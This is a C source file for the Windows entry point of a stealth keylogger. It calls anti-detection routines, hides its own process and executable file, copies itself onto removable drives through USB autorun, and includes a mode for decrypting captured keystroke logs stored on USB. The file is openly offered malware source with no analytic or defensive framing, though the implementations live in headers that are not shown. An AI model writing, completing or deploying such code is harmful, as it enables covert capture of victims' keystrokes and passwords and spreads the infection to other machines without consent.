#include <windows.h>
#include <stdio.h>
#include "keylogger_system.h"
#include "anti_detection.h"
#include "process_hiding.h"
#include "file_hiding.h"
#include "usb_autorun.h"
#include "key_logger_storage.h"

int decrypt_logs(const char* filepath) {
    char* decrypted_data;
    size_t data_size;

    if (key_logger_storage_decrypt_from_usb(filepath, &decrypted_data, &data_size)) {
        printf("Decrypted data (size: %zu bytes):\n%s\n", data_size, decrypted_data);
        safe_free(decrypted_data);
        return 0;
    } else {
        printf("Decryption failed.\n");
        return 1;
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (__argc > 2 && strcmp(__argv[1], "-decrypt") == 0) {
        return decrypt_logs(__argv[2]);
    }

    apply_anti_detection_techniques();

    ProcessHider* process_hider = process_hider_create();
    process_hider->hide_process(process_hider, GetCurrentProcessId());

    KeyloggerSystem* system = keylogger_system_create();
    if (system && keylogger_system_initialize(system)) {
        USBAutorun* usb_autorun = usb_autorun_create();
        char exe_path[MAX_PATH];
        GetModuleFileNameA(NULL, exe_path, MAX_PATH);
        usb_autorun_setup(usb_autorun, exe_path);

        hide_file_attribute(exe_path);

        keylogger_system_run(system);

        usb_autorun_destroy(usb_autorun);
        keylogger_system_shutdown(system);
        keylogger_system_destroy(system);
    }

    process_hider->unhide_process(process_hider, GetCurrentProcessId());
    process_hider_destroy(process_hider);

    return 0;
}